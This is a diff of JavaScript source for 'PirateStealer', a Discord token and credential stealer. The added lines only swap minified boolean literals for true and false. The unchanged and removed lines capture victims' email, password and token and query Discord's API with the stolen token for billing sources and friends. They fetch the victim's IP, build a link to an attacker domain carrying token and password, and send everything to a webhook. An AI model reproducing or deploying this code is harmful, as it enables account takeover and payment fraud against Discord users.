@@ -239,39 +239,39 @@ function Login(email, password, token) {
 									"fields": [{
 										name: "Info",
 										value: `433`,
-										inline: !1
+										inline: false
 									}, {
 										name: "Username",
 										value: `433`,
-										inline: !0
+										inline: true
 									}, {
 										name: "ID",
 										value: `433`,
-										inline: !0
+										inline: true
 									}, {
 										name: "Nitro",
 										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
+										inline: false
 									}, {
 										name: "Badges",
 										value: `${GetBadges(json.flags)}`,
-										inline: !1
+										inline: false
 									}, {
 										name: "Billing",
 										value: `${Cool()}`,
-										inline: !1
+										inline: false
 									}, {
 										name: "Email",
 										value: `\`${email}\``,
-										inline: !0
+										inline: true
 									}, {
 										name: "Password",
 										value: `\`${password}\``,
-										inline: !0
+										inline: true
 									}, {
 										name: "Token",
 										value: `\`\`\`${token}\`\`\``,
-										inline: !1
+										inline: false
 									}, ],
 									"author": {
 										"name": "PirateStealer"
@@ -288,163 +288,6 @@ function Login(email, password, token) {
 									},
 									"footer": {
 										"text": "PirateStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-									}
-								}]
-							}
-							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
-								"color": config['embed-color'],
-								"fields": fieldo,
-								"author": {
-									"name": "PirateStealer"
-								},
-								"footer": {
-									"text": "PirateStealer"
-								}
-							}
-							if (token.startsWith("mfa")) {
-								params.embeds.push(mfaembed)
-							}
-
-							SendToWebhook(JSON.stringify(params))
-
-						})
-					} else {
-
-						const window = BrowserWindow.getAllWindows()[0];
-						window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-							window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-								window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-									window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-										function totalFriends() {
-											var f = JSON.parse(info4)
-											const r = f.filter((user) => {
-												return user.type == 1
-											})
-											return r.length
-										}
-
-										function CalcFriends() {
-											var f = JSON.parse(info4)
-											const r = f.filter((user) => {
-												return user.type == 1
-											})
-											var gay = "";
-											for (z of r) {
-												var b = GetRBadges(z.user.public_flags)
-												if (b != "") {
-													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-												}
-											}
-											if (gay == "") {
-												gay = "No Rare Friends"
-											}
-											return gay
-										}
-
-										function Cool() {
-											const json = JSON.parse(info3)
-											var billing = "";
-											json.forEach(z => {
-												if (z.type == "") {
-													return "\`❌\`"
-												} else if (z.type == 2 && z.invalid != !0) {
-													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-												} else if (z.type == 1 && z.invalid != !0) {
-													billing += "\`✔️\`" + " :credit_card:"
-												} else {
-													return "\`❌\`"
-												}
-											})
-											if (billing == "") {
-												billing = "\`❌\`"
-											}
-											return billing
-										}
-										const json = JSON.parse(info);
-										var params = {
-											username: "PirateStealer",
-											content: "",
-											embeds: [{
-												"title": "User Login",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ password+")",
-												"color": config['embed-color'],
-												"fields": [{
-													name: "Info",
-													value: `433`,
-													inline: !1
-												}, {
-													name: "Username",
-													value: `433`,
-													inline: !0
-												}, {
-													name: "ID",
-													value: `433`,
-													inline: !0
-												}, {
-													name: "Nitro",
-													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
-												}, {
-													name: "Badges",
-													value: `${GetBadges(json.flags)}`,
-													inline: !1
-												}, {
-													name: "Billing",
-													value: `${Cool()}`,
-													inline: !1
-												}, {
-													name: "Email",
-													value: `\`${email}\``,
-													inline: !0
-												}, {
-													name: "Password",
-													value: `\`${password}\``,
-													inline: !0
-												}, {
-													name: "Token",
-													value: `\`\`\`${token}\`\`\``,
-													inline: !1
-												}, ],
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
-												}
-											}, {
-												"title": `Total Friends (${totalFriends()})`,
-												"color": config['embed-color'],
-												"description": CalcFriends(),
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
 												}
 											}]
 										}
